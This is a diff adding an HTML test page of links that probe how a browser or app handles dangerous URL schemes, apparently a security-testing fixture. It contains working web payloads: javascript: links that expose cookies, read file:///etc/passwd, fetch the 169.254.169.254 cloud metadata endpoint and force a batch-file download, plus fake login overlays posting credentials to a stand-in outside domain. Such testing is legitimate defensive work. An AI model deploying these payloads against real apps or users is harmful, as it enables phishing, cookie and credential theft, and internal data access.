@@ -1,0 +1,60 @@
+<h2><a href="javascript:alert(document.domain + ': ' + document.cookie)">Domain &amp; Cookie</a></h2>
+
+<h2><a href="javascript:
+if ('serviceWorker' in navigator) {
+navigator.serviceWorker.register('/sw.js')
+    .then(r => {
+        alert('Service Worker registered! Scope: ' + r.scope)
+    })
+    .catch(e => {
+        alert(e)
+    })
+} else if (!window.isSecureContext) {
+    alert(`[${document.domain}] Insecure Context: ${location.href}`)
+} else {
+    alert('Service Worker unsupported. Browser: ' + navigator.userAgent)
+}">Register Service Worker</a></h2>
+
+<h2><a href="https://nccgroup.com">Normal URL</a></h2>
+<h2><a href="file:///etc/passwd">File URL</a></h2>
+<h2><a href="invalid:///etc/passwd">Invalid URL</a></h2>
+<h2><a href="javascript:location='file:///etc/passwd'">File URL via JavaScript</a></h2>
+<h2><a href="data:text/plain,powershell" download="benign.bat">Data URL</a></h2>
+<h2><a href="javascript:var b=document.createElement('a');b.setAttribute('download','benign.bat');b.href='data:text/plain,powershell';b.click();">Download local content</a></h2>
+<h2><a href="javascript:fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>alert(d)).catch(e=>alert(e));">169.254.169.254</a></h2>
+<h2><a href="javascript:
+
+document.write`
+
+<div style='transform:translate(-50%,-50%);position:fixed;top:50%;left:50%;'>
+    <form method='POST' action='https://i.really.hope.this.domain.doesnt.exist/login'>
+        <h2>Log In</h2>
+        <h2><input type='text' name='u' placeholder='Username'></h2>
+        <h2><input type='password' name='p' placeholder='Password'></h2>
+        <h2><input type='submit'></h2>
+    </form>
+</div>
+
+`
+
+">Fish 1</a></h2>
+
+
+<h2><a href="javascript:
+
+location=`javascript:
+
+document.write\`
+
+<div style='transform:translate(-50%,-50%);position:fixed;top:50%;left:50%;'>
+    <form method='POST' action='https://i.really.hope.this.domain.doesnt.exist/login'>
+        <h2>Log In</h2>
+        <h2><input type='text' name='u' placeholder='Username'></h2>
+        <h2><input type='password' name='p' placeholder='Password'></h2>
+        <h2><input type='submit'></h2>
+    </form>
+</div>
+
+\`
+
+`">Fish 2</a></h2>
